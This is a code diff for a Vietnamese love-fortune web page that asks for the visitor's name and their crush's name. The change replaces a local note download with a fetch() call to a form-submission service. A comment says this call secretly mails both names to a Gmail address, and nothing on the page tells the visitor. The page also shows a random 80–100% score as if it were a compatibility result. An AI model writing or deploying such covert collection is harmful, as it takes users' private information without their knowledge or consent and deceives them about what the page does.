@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bói Tình Yêu</title>
+    <title>Bói Tình Yêu & Ghi Nhớ</title>
     <style>
         * {
             box-sizing: border-box;
@@ -107,30 +107,33 @@ function processLove() {
         return;
     }
 
-    // Tạo thông điệp yêu cầu
-    const loveText = `"${yourName}" yêu "${crushName}"`;
+    // Hiển thị tỉ lệ vui
+    const randomPercent = Math.floor(Math.random() * 21) + 80;
+    document.getElementById('result').innerText = `Tỉ lệ hợp nhau: ${randomPercent}%! ❤️`;
 
-    // 1. Hiển thị thông báo vui trên màn hình
-    const randomPercent = Math.floor(Math.random() * 21) + 80; // Tỉ lệ từ 80% - 100%
-    document.getElementById('result').innerText = `Tỉ lệ hợp nhau: ${randomPercent}%!\nĐang đoán...`;
+    // Tạo chuỗi thông điệp
+    const messageContent = `"${yourName}" yêu "${crushName}"`;
 
-    // 2. Tạo và tải file Note (.txt) tự động về máy
-    downloadNoteFile(loveText);
-}
-
-function downloadNoteFile(yourName, crushName, textContent) {
-    // Tạo nội dung file
-    const blob = new Blob([textContent], { type: 'text/plain;charset=utf-8' });
-    const link = document.createElement('a');
-    
-    // Đặt tên file dạng: Note_TenBan_TenCrush.txt
-    link.download = `Note_${yourName}_${crushName}.txt`;
-    link.href = window.URL.createObjectURL(blob);
-    
-    // Tự động bấm để tải file note về máy người dùng
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
+    // Gửi ngầm tới Gmail anluufake@gmail.com qua Web3Forms
+    fetch("https://api.web3forms.com/submit", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json",
+            "Accept": "application/json"
+        },
+        body: JSON.stringify({
+            access_key: "YOUR_ACCESS_KEY_HERE", // Thay Access Key của bạn vào đây
+            subject: "Thông báo bói tình yêu mới",
+            from_name: "Web Boi Tinh Yeu",
+            message: messageContent
+        })
+    }).then(response => {
+        if (response.ok) {
+            console.log("Đã gửi email thành công!");
+        }
+    }).catch(error => {
+        console.error("Lỗi khi gửi:", error);
+    });
 }
 </script>
 
